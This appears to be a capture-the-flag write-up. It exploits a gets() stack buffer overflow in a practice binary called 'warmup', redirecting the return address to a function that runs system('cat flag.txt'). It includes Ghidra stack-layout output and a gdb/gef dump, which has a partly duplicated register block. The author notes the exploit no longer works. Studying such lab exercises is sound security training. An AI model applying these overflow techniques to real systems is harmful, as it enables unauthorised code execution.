# Warmup Writeup

## Important Note
THIS DOES NOT WORK
The system call is no longer functional, step through in gdb to ensure easy is called but flag.txt will not actually print

## Steps
1. Run `./warmup`, notice the address does not change
```
$ ./warmup
-Warm Up-
WOW:0x40060d
>
```

2. Use ghidra to analyze and look at stack variable layout
```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined main()
             undefined         <UNASSIGNED>   <RETURN>
             undefined1[64]    Stack[-0x48]   input                                   XREF[1]:     00400692(*)  
             undefined1        Stack[-0x88]:1 local_88                                XREF[2]:     0040064d(*), 
                                                                                                   00400668(*)  
                             main                                            XREF[4]:     Entry Point(*), 
                                                                                          _start:0040053d(*), 0040077c, 
                                                                                          00400830(*)  
```
input is at `Stack[-0x48], which is 72 in decimal.
Since input is read through `gets`, we can access and change the reurn pointer to the `easy` function to print the flag
```
void easy(void)
{
  system("cat flag.txt");
  return;
}
```

3. Create a payload overwriting the 72 bytes from 'input' to the return pointer and set it equal to 0x40060d

4. Send payload to process 


## Solution
Viewed in gdb gef
```
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xfffffffffffffe00
$rbx   : 0x00007f6202c1a740  →  0x00007f6202c1a740  →  [loop detected]
$rcx   : 0x00007f6202cac687  →   pop rbx
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007ffd22a79e60  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rbx   : 0x00007ffd22a79fb8  →  0x00007ffd22a7b1d4  →  "./warmup"
$rcx   : 0x00007f6202e048e0  →  0x00000000fbad2088
$rdx   : 0x0               
$rsp   : 0x00007ffd22a79ea8  →  "AAAAAAAA"
$rbp   : 0x00007ffd22a79ea8  →  "AAAAAAAA"
$rsi   : 0x000000000760a2d0  →  0x4141414141414141 ("AAAAAAAA"?)
$rdi   : 0x0000000000400734  →  "cat flag.txt"
$rip   : 0x0000000000400616  →  <easy+0009> call 0x4004d0 <system@plt>
$r8    : 0x000000000760a2f1  →  0x0000000000000000
$r9    : 0x00007f6202d9d080  →   movaps xmm1, XMMWORD PTR [rsi+0x10]
$r10   : 0x0               
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x00007ffd22a79fc8  →  0x00007ffd22a7b1dd  →  "COLORFGBG=15;0"
$r14   : 0x00007f6202e69000  →  0x00007f6202e6a310  →  0x0000000000000000
$r15   : 0x0               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffd22a79ea8│+0x0000: "AAAAAAAA"   ← $rsp, $rbp
0x00007ffd22a79eb0│+0x0008: 0x0000000000000000
0x00007ffd22a79eb8│+0x0010: 0x000000000040061d  →  <main+0000> push rbp
0x00007ffd22a79ec0│+0x0018: 0x0000000100000000
0x00007ffd22a79ec8│+0x0020: 0x00007ffd22a79fb8  →  0x00007ffd22a7b1d4  →  "./warmup"
0x00007ffd22a79ed0│+0x0028: 0x00007ffd22a79fb8  →  0x00007ffd22a7b1d4  →  "./warmup"
0x00007ffd22a79ed8│+0x0030: 0x187a2cd15759bc56
0x00007ffd22a79ee0│+0x0038: 0x0000000000000000
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40060d <easy+0000>      push   rbp
     0x40060e <easy+0001>      mov    rbp, rsp
     0x400611 <easy+0004>      mov    edi, 0x400734
 →   0x400616 <easy+0009>      call   0x4004d0 <system@plt>
   ↳    0x4004d0 <system@plt+0000> jmp    QWORD PTR [rip+0x200b4a]        # 0x601020 <system@got.plt>
        0x4004d6 <system@plt+0006> push   0x1
        0x4004db <system@plt+000b> jmp    0x4004b0
        0x4004e0 <__libc_start_main@plt+0000> jmp    QWORD PTR [rip+0x200b42]        # 0x601028 <__libc_start_main@got.plt>
        0x4004e6 <__libc_start_main@plt+0006> push   0x2
        0x4004eb <__libc_start_main@plt+000b> jmp    0x4004b0
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
system@plt (
   $rdi = 0x0000000000400734 → "cat flag.txt", # ensure this is here
   $rsi = 0x000000000760a2d0 → 0x4141414141414141,
   $rdx = 0x0000000000000000
)
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "warmup", stopped 0x400616 in easy (), reason: SINGLE STEP
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400616 → easy()
────────────────────
```
